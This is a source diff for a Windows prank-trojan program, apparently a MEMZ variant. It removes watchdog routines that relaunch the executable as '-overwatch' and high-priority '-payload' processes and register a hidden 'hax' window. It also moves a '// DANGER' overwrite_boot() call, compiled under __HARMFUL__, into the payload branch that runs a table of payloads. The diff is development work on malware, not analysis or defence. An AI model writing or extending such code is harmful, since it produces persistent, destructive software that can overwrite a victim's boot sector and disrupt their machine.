@@ -4,7 +4,6 @@
 #include <memz/data.h>
 
 #include <Windows.h>
-#include <stdio.h>
 #include <string.h>
 
 
@@ -48,69 +47,8 @@ void overwrite_boot() // DANGER
 }
 #endif
 
-void start_overwatch()
-{
-    LPSTR fn = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 8192*2);
-    GetModuleFileName(NULL, fn, 8192);
-
-    for (int i = 0; i < 2; i++)
-        ShellExecute(NULL, NULL, fn, "-overwatch", NULL, SW_SHOWDEFAULT);
-
-    SHELLEXECUTEINFO info;
-    info.cbSize = sizeof(SHELLEXECUTEINFO);
-    info.lpFile = fn;
-    info.lpParameters = "-payload";
-    info.fMask = SEE_MASK_NOCLOSEPROCESS;
-    info.hwnd = NULL;
-    info.lpVerb = NULL;
-    info.lpDirectory = NULL;
-    info.hInstApp = NULL;
-    info.nShow = SW_SHOWDEFAULT;
-
-    ShellExecuteEx(&info);
-    SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
-    ExitProcess(0);
-}
-
-void overwatch()
-{
-    printf("From overwatch\n");
-    CreateThread(NULL, 0, overwatch_thread, NULL, 0, 0);
-
-    WNDCLASSEXA c;
-    c.cbSize = sizeof(WNDCLASSEXA);
-    c.lpfnWndProc = window_proc;
-    c.lpszClassName = "hax";
-    c.style = 0;
-    c.cbClsExtra = 0;
-    c.cbWndExtra = 0;
-    c.hInstance = NULL;
-    c.hIcon = 0;
-    c.hCursor = 0;
-    c.hbrBackground = 0;
-    c.lpszMenuName = NULL;
-    c.hIconSm = 0;
-
-    RegisterClassExA(&c);
-
-    CreateWindowExA(0, "hax", NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
-
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-}
-
 int main(int argc, char* argv[])
 {
-#ifdef __HARMFUL__
-    overwrite_boot(); // DANGER
-#endif
-    
-    notepad_alert();
-
     if (argc == 1)
         start_overwatch();
 
@@ -119,6 +57,10 @@ int main(int argc, char* argv[])
 
     else if (!strcmp(argv[1], "-payload"))
     {
+#ifdef __HARMFUL__
+        overwrite_boot(); // DANGER
+#endif
+        notepad_alert();
         payload_t payloads[] =
         {
             { shell_execute, 10, 10, 10000, 0, 0 },
